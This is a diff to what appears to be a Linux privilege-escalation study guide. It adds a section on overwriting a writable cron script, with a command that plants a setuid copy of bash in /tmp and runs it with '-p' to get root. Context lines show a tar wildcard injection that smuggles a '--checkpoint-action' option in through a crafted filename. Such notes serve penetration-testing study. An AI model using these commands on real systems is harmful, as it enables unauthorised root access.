@@ -468,6 +468,24 @@ touch /home/user/--checkpoint-action=sh\runme.sh
 - **Why this works**  
 So in this case, because of the wildcard, the system interprets this as the command `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=sh\runme.sh`
 
+### Escalation via Cron Overwrites
+- **Summary**  
+We just add a command to a script in the cron job or replace the file called in the cron job.
+
+- **Example**  
+We the following script (/usr/local/bin/overwrite.sh) being run by cron every minute and we have read/write permissions and it contains the following:
+```
+#!/bin/bash
+
+echo 'date' > /tmp/useless
+```
+All we have to do is append a command to the end. We can do a reverse shell or local privilege escalation.
+```
+# Local PrivEsc
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+```
+After it runs, we can just execute new bash from our script like we did before `/tmp/bash -p`
+
 # Escalation Path: NFS Root Squashing
 
 # Escalation Path: Docker
